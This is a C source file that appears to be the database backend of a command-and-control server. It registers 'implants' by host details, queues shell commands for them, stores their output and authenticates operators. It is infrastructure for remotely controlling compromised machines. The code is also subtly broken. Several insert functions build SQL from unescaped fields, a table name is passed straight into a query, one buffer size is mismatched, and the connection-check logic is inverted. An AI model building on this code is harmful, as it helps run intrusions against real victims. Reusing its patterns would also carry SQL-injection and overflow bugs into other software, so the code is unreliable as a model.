#include "db.h"

#include <mysql/mysql.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <cjson/cJSON.h>

#include <crypt.h>
#include "logs.h"
#include "common.h"

//static DBConfig g_dbconf;

//int db_conn(const char *dbserver, const char *user, const char *pass, const char *db) {
//    g_dbconf.host = dbserver;
//    g_dbconf.user = user;
//    g_dbconf.pass = pass;
//    g_dbconf.db   = db;
//    //g_dbconf.port = port;
//    con = mysql_init(NULL);
//    if (con == NULL) return -1;
//    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) return -1;
//    return 0;
//}

void db_close() {
    mysql_close(con);
}

int check_implant_id(char *implant_id) {
    mysql_thread_init();
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char query[1024];
    snprintf(query, sizeof(query), "SELECT * FROM Implants WHERE implant_id = '%s'", esc);
    if (mysql_query(con, query)) return 0;
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return 0;
    int num_rows = mysql_num_rows(result);
    mysql_free_result(result);

    return (num_rows > 0);
}

char *get_task(int task_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);
    if (mysql_query(con, query)) return NULL;
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return NULL;
    MYSQL_ROW row = mysql_fetch_row(result);
    char *cmd = NULL;
    if (row && row[0]) cmd = strdup(row[0]);
    mysql_free_result(result);
    return cmd;
}

void store_task_response(char *response, int task_id) {
    char esc[BUFFER_SIZE * 2];
    mysql_real_escape_string(con, esc, response, strlen(response));
    char *query = malloc(strlen(esc) + 256);
    snprintf(query, strlen(esc) + 256, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", esc, task_id);
    mysql_query(con, query);
    free(query);

}

int check_tasks_queue(char *implant_id) {
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char query[1024];
    snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE implant_id = '%s';", esc);
    if (mysql_query(con, query)) return -1;
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return -1;
    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        if (row[1] != NULL && atoi(row[1]) == 0) {
            int task_id = atoi(row[0]);
            mysql_free_result(result);
            return task_id;
        }
    }
    mysql_free_result(result);
    return -1;
}

void new_implant(struct db_agents args) {
    char query[2048];
    snprintf(query, sizeof(query), "INSERT INTO Implants (implant_id, os, ip, arch, hostname) VALUES ('%s', '%s', '%s', '%s', '%s');",
             args.implant_id, args.os, args.ip, args.arch, args.hostname);
    mysql_query(con, query);

}

void update_last_seen(char *implant_id) {
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char query[1024];
    snprintf(query, sizeof(query), "UPDATE Implants SET last_seen = CURRENT_TIMESTAMP() WHERE implant_id = '%s';", esc);
    mysql_query(con, query);

}

void TasksTable(struct db_tasks args) {
    char query[4096 + 4096];
    snprintf(query, sizeof(query), "INSERT INTO Tasks (implant_id, command, response) VALUES ('%s', '%s', '%s');",
             args.implant_id, args.command, args.response);
    mysql_query(con, query);
}

void new_tasks(char *implant_id, char *command) {
    char esc_id[130];
    char esc_cmd[1024];
    mysql_real_escape_string(con, esc_id, implant_id, strlen(implant_id));
    mysql_real_escape_string(con, esc_cmd, command, strlen(command));
    char *query = malloc(1024 + 130);
    snprintf(query, 1024 + 256, "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
    if (mysql_ping(con) != 0) {
        mysql_query(con, query);
    }
    free(query);

}

char *tasks_per_implant(char *implant_id) {
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '%s';", esc);
    if (mysql_ping(con) != 0) {
        if (mysql_query(con, query)) {
            log_message(LOG_ERROR, "Getting Tasks Per Implant Query Failed: %s", mysql_error(con));
            return NULL;
        }
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) {
        log_message(LOG_ERROR, "Failed to store result [Getting Tasks Per Implant]: %s", mysql_error(con));
        return NULL; 
    }
    int num_fields = mysql_num_fields(result);
    MYSQL_FIELD *fields = mysql_fetch_fields(result);
    cJSON *column_arrays[num_fields];
    for (int i = 0; i < num_fields; i++) column_arrays[i] = cJSON_CreateArray();
    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        for (int i = 0; i < num_fields; i++) {
            if (row[i]) cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
            else cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
        }
    }
    cJSON *root = cJSON_CreateObject();
    for (int i = 0; i < num_fields; i++) cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
    char *json_output = cJSON_Print(root);
    cJSON_Delete(root);
    mysql_free_result(result);
    free(query);

    return json_output;
}


int authenticate_operator(char *username, char *password) {
    // Input validation

    
    if (!username || !password) return -1;
    if (strlen(username) > 100 || strlen(password) > 100) return -1;

    // Escape username (prevent SQL injection)
    char esc_user[128];
    if (strlen(username) * 2 + 1 > sizeof(esc_user)) return -1;
    mysql_real_escape_string(con, esc_user, username, strlen(username));

    // Build query (check for truncation)
    char query[256];
    if (snprintf(query, sizeof(query),
                "SELECT password FROM Operators WHERE username='%s'", 
                esc_user) >= (int)sizeof(query)) {
        return -1;
    }

    // Execute query
    //for (int i = 0; i < 3; i++) {
        if (mysql_ping(con) != 0) {

            if (db_conn(g_dbconf.host, g_dbconf.user, g_dbconf.pass, g_dbconf.db) == -1) {
                log_message(LOG_ERROR, "Reconnection failed: %s", mysql_error(con));
                return -1;
            }
        }
        if (mysql_query(con, query)) {
            //fprintf(stderr, "[-] Query failed: %s\n", mysql_error(con));
            log_message(LOG_ERROR, "Authentication Query Failed: %s", mysql_error(con));
            return -1;
        }
    //}   
    // Store result
    MYSQL_RES *res = mysql_store_result(con);
    if (!res) {
        //fprintf(stderr, "[-] Failed to store result: %s\n", mysql_error(con));
        log_message(LOG_ERROR, "Failed to store result [Authentication]: %s", mysql_error(con));
        return -1;
    }
    // Fetch row
    MYSQL_ROW row = mysql_fetch_row(res);
    if (!row || !row[0]) {
        mysql_free_result(res);
        return -1;  // User not found
    }

    // Verify bcrypt hash
    const char *stored_hash = row[0];
    if (strlen(stored_hash) < 60 || stored_hash[0] != '$') {
        mysql_free_result(res);

        return -1;  // Invalid hash format
    }

    // Verify using crypt()
    char *result = crypt(password, stored_hash);
    
    if (result == NULL) {
        //perror("crypt() failed");
        log_message(LOG_ERROR, "crypt failed");

        return 1;
    }

    int auth_result;
    if (strcmp(result, stored_hash) == 0) { 
        auth_result = 0;
    } else {
        auth_result = -1;
    }
    mysql_free_result(res);
    return auth_result;
}

/*
int authenticate_operator(char *username, char *password) {
    char esc_user[128];
    char esc_pass[128];
    mysql_real_escape_string(con, esc_user, username, strlen(username));
    mysql_real_escape_string(con, esc_pass, password, strlen(password));
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT * FROM Operators WHERE username='%s' AND password='%s';", esc_user, esc_pass);
    if (mysql_query(con, query)) return -1;
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return -1;
    int num_rows = mysql_num_rows(result);
    mysql_free_result(result);
    free(query);
    return (num_rows > 0) ? 0 : -1;
}
*/

char *GetData(char *table) {
    char esc[256];
    mysql_real_escape_string(con, esc, table, strlen(table));
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT * FROM %s;", esc);
    if (mysql_query(con, query)) return NULL;
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return NULL;
    int num_fields = mysql_num_fields(result);
    MYSQL_FIELD *fields = mysql_fetch_fields(result);
    cJSON *column_arrays[num_fields];
    for (int i = 0; i < num_fields; i++) column_arrays[i] = cJSON_CreateArray();
    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        for (int i = 0; i < num_fields; i++) {
            if (row[i]) cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
            else cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
        }
    }
    cJSON *root = cJSON_CreateObject();
    for (int i = 0; i < num_fields; i++) cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
    char *json_output = cJSON_Print(root);
    cJSON_Delete(root);
    mysql_free_result(result);
    free(query);
    return json_output;
}

void LogsTable(struct db_logs args) {
    char query[4096+1028];
    snprintf(query, sizeof(query), "INSERT INTO Logs (implant_id, log_type, message) VALUES ('%s', '%s', '%s');",
             args.implant_id, args.log_type, args.message);
    mysql_query(con, query);
}

char *cmd_and_response(int task_id) {
    char query[256];
    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);

    if (mysql_query(con, query)) {
        return NULL;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) {
        return NULL;
    }

    MYSQL_ROW row = mysql_fetch_row(result);
    char *cmd = NULL;

    if (row && row[0]) {
        cmd = strdup(row[0]);  // Copy command string
    }

    mysql_free_result(result);
    return cmd;  // Must be freed by the caller
}
